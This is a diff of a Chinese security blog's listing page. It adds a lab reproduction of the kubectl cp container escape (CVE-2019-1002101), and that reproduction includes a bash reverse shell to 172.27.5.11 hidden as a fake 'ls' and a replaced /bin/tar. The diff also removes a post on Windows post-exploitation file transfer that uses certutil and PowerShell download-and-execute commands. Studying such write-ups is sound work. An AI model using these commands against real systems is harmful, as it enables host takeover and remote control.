@@ -1,4 +1,131 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Sally"><title>Sally's Blog</title><meta name="description" content="A simple and beautiful blog"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">主页</a></li><li> <a href="/archives">归档</a></li><li> <a href="/tags">标签</a></li><li> <a href="/about">关于</a></li><li> <a href="/links">友链</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)" style="display:none;"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/kabi.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/kabi.jpg" style="width:220px;" alt="favicon"><h3 title=""><a href="/">Sally's Blog</a></h3><div class="description"><p>A simple and beautiful blog</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/phoenixmerk"><i class="fa fa-github"></i></a></li><li><a href="mailto:yourname@example.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://zhihu.com/people/jin-xin-4-68"><i class="fa fa-mortar-board"></i></a></li></ul><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="220" height="86" src="//music.163.com/outchain/player?type=2&amp;id=1293913379&amp;auto=1&amp;height=66&amp;&amp;loop=1"></iframe></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Sally</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/09/12/CVE-2018-15664%20%E5%88%A9%E7%94%A8%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">CVE-2018-15664 利用符号链接容器逃逸</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Sally-blue.svg"></a></p>
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Sally"><title>Sally's Blog</title><meta name="description" content="A simple and beautiful blog"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">主页</a></li><li> <a href="/archives">归档</a></li><li> <a href="/tags">标签</a></li><li> <a href="/about">关于</a></li><li> <a href="/links">友链</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)" style="display:none;"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/kabi.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/kabi.jpg" style="width:220px;" alt="favicon"><h3 title=""><a href="/">Sally's Blog</a></h3><div class="description"><p>A simple and beautiful blog</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/phoenixmerk"><i class="fa fa-github"></i></a></li><li><a href="mailto:yourname@example.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://zhihu.com/people/jin-xin-4-68"><i class="fa fa-mortar-board"></i></a></li></ul><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="220" height="86" src="//music.163.com/outchain/player?type=2&amp;id=1293913379&amp;auto=1&amp;height=66&amp;&amp;loop=1"></iframe></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Sally</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/10/09/CVE-2019-1002101%20kubectl%20cp%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">CVE-2019-1002101 kubectl cp容器逃逸</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Sally-blue.svg"></a></p>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Twistlock的流程图很好的解释了kubectl cp漏洞的利用链及其原理。</p>
+<ol>
+<li><p>启动一个被破坏或者恶意的容器</p>
+</li>
+<li><p>攻击者准备一个恶意的tar包（包含恶意软链接，例如：.&#x2F;baddir&#x2F;twist-&gt;&#x2F;proc&#x2F;self&#x2F;cwd）</p>
+</li>
+<li><p>此时容器中的二进制tar包被替换成恶意tar包</p>
+</li>
+<li><p>用户运行kubectl cp将文件从容器传输到宿主机</p>
+</li>
+<li><p>kubectl提取恶意tar包中的文件（此时会解析其中的恶意软链接，即写入到宿主机的 &#x2F;proc&#x2F;self&#x2F;cwd 路径）</p>
+</li>
+<li><p>攻击者可以控制恶意软链接，将文件写到宿主机任意位置</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/bug.jpg" alt="bug"></p>
+</li>
+</ol>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Redhat Openshift_Container_Platform 3.10</p>
+<p>Kubernetes 1.14.0</p>
+<p>Redhat Openshift_Container_Platform 3.11</p>
+<p>1.12.0 &lt;&#x3D; Kubernetes &lt; 1.12.7</p>
+<p>Redhat Openshift_Container_Platform 3.9</p>
+<p>1.13.0 &lt;&#x3D; Kubernetes &lt; 1.13.5</p>
+<p>1.11.0 &lt;&#x3D; Kubernetes &lt; 1.11.9</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>Kubernetes 1.11.1</p>
+<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><ol>
+<li>使用Metarget创建单节点k8s集群</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./metarget cnv install cve-2019-1002101 --domestic</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009101802523.png" alt="image-20231009101802523"></p>
+<p>可以看到单节点集群环境安装成功（需要使用<code>--domestic</code>安装单节点k8s集群）</p>
+<ol start="2">
+<li>创建一个Pod并运行Nginx容器，查看运行状态</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run nginx --image=nginx</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009103109364.png" alt="image-20231009103109364"></p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009103202133.png" alt="image-20231009103202133"></p>
+<h4 id="brompwnie的做法"><a href="#brompwnie的做法" class="headerlink" title="brompwnie的做法"></a>brompwnie的做法</h4><ol>
+<li>首先从github中获取我们需要的三个文件</li>
+</ol>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009141000443.png" alt="image-20231009141000443"></p>
+<ol start="2">
+<li>使用kubectl cp将文件传输到容器中（这样传文件比较方便）</li>
+</ol>
+<p>注意：createPwnTar.sh中需要修改反弹shell命令中的<code>x.x.x.x/端口</code>为攻击机的ip和端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="built_in">cp</span> /home/safedog/setupTar.sh nginx-64f497f8fd-wdsg2:.</span><br><span class="line">kubectl <span class="built_in">cp</span> /home/safedog/badbin nginx-64f497f8fd-wdsg2:.</span><br><span class="line">kubectl <span class="built_in">cp</span> /home/safedog/createPwnTar.sh nginx-64f497f8fd-wdsg2:.</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>赋予三个文件执行权限</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x badbin setupTar.sh createPwnTar.sh</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>依次执行createPwnTar.sh和setupTar.sh</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./createPwnTar.sh</span><br><span class="line">./setupTar.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009141521362.png" alt="image-20231009141521362"></p>
+<ol start="5">
+<li>攻击机远程监听，宿主机执行kubectl cp将恶意符号链接植入宿主机，之后只要在植入的路径打开终端便能够反弹shell</li>
+</ol>
+<p>宿主机执行<code>kubectl cp</code>命令</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009142741919.png" alt="image-20231009142741919"></p>
+<p>宿主机在路径下打开终端，攻击机获取反弹shell</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009142847787.png" alt="image-20231009142847787"></p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009142923329.png" alt="image-20231009142923329"></p>
+<h4 id="h4ckm310n的做法"><a href="#h4ckm310n的做法" class="headerlink" title="h4ckm310n的做法"></a>h4ckm310n的做法</h4><ol>
+<li>使用kubectl进入容器命令行，进行恶意tar包构造</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="built_in">exec</span> -it nginx-64f497f8fd-wdsg2 -- /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>在当前目录下创建了一个名为 <code>badbin</code> 的符号链接，指向系统的 <code>/bin</code> 目录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /bin ./badbin</span><br></pre></td></tr></table></figure>
+
+<p>这个步骤将 <code>/bin</code> 目录的符号链接<code>badbin</code>一起打包到了 <code>malicious.tar</code> 中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cf malicious.tar ./badbin</span><br></pre></td></tr></table></figure>
+
+<p>这个命令尝试删除当前目录下的 <code>./badbin</code> 目录。但由于 <code>./badbin</code> 是一个符号链接，删除操作不会影响到 <code>/bin</code> 目录，因为它只会删除链接而不会删除链接指向的目录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f ./badbin</span><br></pre></td></tr></table></figure>
+
+<p>这个命令在当前目录下创建了一个名为 <code>./badbin</code> 的新目录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ./badbin</span><br></pre></td></tr></table></figure>
+
+<p>这个命令使用 <code>echo</code> 将一段脚本写入 <code>./badbin/ls</code> 文件。这段脚本实际上是一个简单的反向 shell，它试图连接到 IP 地址 <code>172.27.5.11</code> 的 TCP 端口 <code>12345</code>，并将命令执行的结果发送到该连接。这是一个潜在的恶意操作，可以用于入侵和远程控制目标系统。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;#!/bin/bash\n/bin/bash -i &gt;&amp; /dev/tcp/172.27.5.11/12345 0&gt;&amp;1&#x27;</span> &gt; ./badbin/ls</span><br></pre></td></tr></table></figure>
+
+<p>这个命令将 <code>./badbin/ls</code> 文件的执行权限设置为可执行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x ./badbin/ls</span><br></pre></td></tr></table></figure>
+
+<p>这个命令将新创建的 <code>./badbin/ls</code> 文件添加到之前创建的 <code>malicious.tar</code> 归档文件中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -rf malicious.tar ./badbin/ls</span><br></pre></td></tr></table></figure>
+
+<p>创建恶意test文件，内容如下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cat</span> /malicious.tar</span><br></pre></td></tr></table></figure>
+
+<p>将其替换到&#x2F;bin&#x2F;tar中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf /bin/tar</span><br><span class="line"><span class="built_in">cp</span> <span class="built_in">test</span> /bin/tar</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>攻击机远程监听，宿主机执行kubectl cp将恶意符号链接植入宿主机，并执行ls命令触发反弹shell</li>
+</ol>
+<p>kali攻击机进行监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 12345</span><br></pre></td></tr></table></figure>
+
+<p>宿主机执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="built_in">cp</span>  nginx-64f497f8fd-wdsg2:<span class="built_in">test</span> /home/safedog</span><br></pre></td></tr></table></figure>
+
+<p>宿主机执行<code>kubectl cp</code>成功后可以发现bin目录被携带下来</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009140545804.png" alt="image-20231009140545804"></p>
+<p>宿主机执行成功后执行ls命令，可以在攻击机上获取反弹的shell</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009140316389.png" alt="image-20231009140316389"></p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20231009140228230.png" alt="image-20231009140228230"></p>
+<h2 id="总结思考检测方式"><a href="#总结思考检测方式" class="headerlink" title="总结思考检测方式"></a>总结思考检测方式</h2><ol>
+<li>版本检测</li>
+</ol>
+<p>根据漏洞影响的版本信息进行检测</p>
+<ol start="2">
+<li>敏感目录&#x2F;bin&#x2F;tar</li>
+</ol>
+<p>监控异常指令修改&#x2F;bin&#x2F;tar目录导致漏洞利用</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>POC：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/brompwnie/CVE-2019-1002101-Helpers">https://github.com/brompwnie/CVE-2019-1002101-Helpers</a></p>
+<p><a target="_blank" rel="noopener" href="https://h4ckm310n.com/?p=528">https://h4ckm310n.com/?p=528</a></p>
+<p>漏洞通告：</p>
+<p><a target="_blank" rel="noopener" href="https://discuss.kubernetes.io/t/announce-security-release-of-kubernetes-kubectl-potential-directory-traversal-releases-1-11-9-1-12-7-1-13-5-and-1-14-0-cve-2019-1002101/5712">https://discuss.kubernetes.io/t/announce-security-release-of-kubernetes-kubectl-potential-directory-traversal-releases-1-11-9-1-12-7-1-13-5-and-1-14-0-cve-2019-1002101/5712</a></p>
+</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-10-09</span><i class="fa fa-tag"></i><a class="tag" href="/tags/容器安全/" title="容器安全">容器安全 </a><span class="leancloud_visitors"></span><span>About 1138 words, 3 min 47 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/09/12/CVE-2018-15664%20%E5%88%A9%E7%94%A8%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">CVE-2018-15664 利用符号链接容器逃逸</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Sally-blue.svg"></a></p>
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Docker &lt;&#x3D; 18.06.1-ce-rc2</p>
 <h2 id="Docker-cp"><a href="#Docker-cp" class="headerlink" title="Docker cp"></a>Docker cp</h2><p>Docker cp命令能够将容器内的文件向宿主机复制，也能够实现宿主机文件向容器中复制。</p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将容器中的文件复制到宿主机中</span></span><br><span class="line">docker cp container_id:file_path_in_container host_path</span><br></pre></td></tr></table></figure>
@@ -841,52 +968,4 @@
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location ~* ^.+\.(gif|jpg|png|swf|flv|rar|zip)$ &#123;     </span><br><span class="line">  valid_referers none blocked server_names *.test.com http://localhost baidu.com;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$invalid_referer</span>) &#123;         </span><br><span class="line">    rewrite ^/ [img]http://www.XXX.com/images/default/logo.gif[/img];         </span><br><span class="line">    <span class="comment"># return403;     </span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-06-03</span><i class="fa fa-tag"></i><a class="tag" href="/tags/安全加固/" title="安全加固">安全加固 </a><span class="leancloud_visitors"></span><span>About 1368 words, 4 min 33 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/06/02/Windows%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/">Windows文件传输</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Sally-blue.svg"></a></p>
-<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>攻击机：</p>
-<p>python快速开启ftp服务器</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyftpdlib</span><br><span class="line">python3 -m pyftpdlib</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230602193643551.png" alt="image-20230602193643551"></p>
-<p>目标机：</p>
-<p>用控制台写入一个ftp.txt文件，使用匿名登录anonymous到攻击机的ftp服务，从攻击机上下载恶意文件msftest.apk</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">copy con ftp.txt </span><br><span class="line">open 192.168.1.227 2121 </span><br><span class="line">anonymous</span><br><span class="line">anonymous</span><br><span class="line">get msftest.apk</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230602195727154.png" alt="image-20230602195727154"></p>
-<p>保存为ftp.txt文件：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp -i -s:ftp.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230602195704765.png" alt="image-20230602195704765"></p>
-<h2 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a>Certutil</h2><p>下载并执行</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.227:8000/shell.exe shell.exe&amp;shell.exe</span><br></pre></td></tr></table></figure>
-
-<p>清除下载缓存</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.227:8000/shell.exe delete</span><br></pre></td></tr></table></figure>
-
-<p>缓存目录：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">%</span><span class="language-bash">USERPROFILE%\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><p>创建下载对象</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = <span class="built_in">new-object</span> system.net.webclient</span><br><span class="line"><span class="variable">$p</span>.downloadfile(<span class="string">&quot;http://x.xx.xx.x/file&quot;</span>,<span class="string">&quot;c:vxx/x/file&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>完整命令示例</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$p</span>=new-object system.net.webclient;<span class="variable">$p</span>.DownloadFile(&#x27;http://192.168.1.227/s.txt&#x27;,&#x27;s.txt\&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line">powershell (<span class="built_in">new-object</span> system.net.webclient).downloadfile(<span class="string">&#x27;http://192.168.1.227/s.txt&#x27;</span>,<span class="string">&#x27;s.txt\&#x27;</span>)</span><br><span class="line"></span><br><span class="line">powershell <span class="built_in">Invoke-WebRequest</span> <span class="literal">-uri</span> <span class="string">&quot; http://192.168.1.227/s.txt &quot;</span> <span class="literal">-OutFile</span> <span class="string">&quot;<span class="variable">$env:temp</span>\s.php&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="SCP"><a href="#SCP" class="headerlink" title="SCP"></a>SCP</h2><p>文件上传</p>
-<ul>
-<li>file.txt为要上传的文件名</li>
-<li>username为您的用户名</li>
-<li>remote_host为远程主机名或IP地址</li>
-<li>&#x2F;remote_directory&#x2F;为要将文件上传到的远程目录路径</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp file.txt username@remote_host:/remote_directory/</span><br></pre></td></tr></table></figure>
-
-<p>文件下载</p>
-<ul>
-<li>username为您的用户名</li>
-<li>remote_host为远程主机名或IP地址</li>
-<li>&#x2F;remote_directory&#x2F;file.txt为下载的远程文件路径</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp username@remote_host:/remote_directory/file.txt .</span><br></pre></td></tr></table></figure>
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里列举了几种Windows下常见的文件上传和下载方式，主要用来在获取shell后进行进一步的上传木马文件或者下载敏感文件。</p>
-</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-06-02</span><i class="fa fa-tag"></i><a class="tag" href="/tags/内网渗透/" title="内网渗透">内网渗透 </a><span class="leancloud_visitors"></span><span>About 385 words, 1 min 17 sec  read</span></div></div></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/page/3/">Next</a></li></ul></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div><script src="/js/baidu-tongji.js"></script></body></html>
+</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-06-03</span><i class="fa fa-tag"></i><a class="tag" href="/tags/安全加固/" title="安全加固">安全加固 </a><span class="leancloud_visitors"></span><span>About 1368 words, 4 min 33 sec  read</span></div></div></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/page/3/">Next</a></li></ul></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div><script src="/js/baidu-tongji.js"></script></body></html>
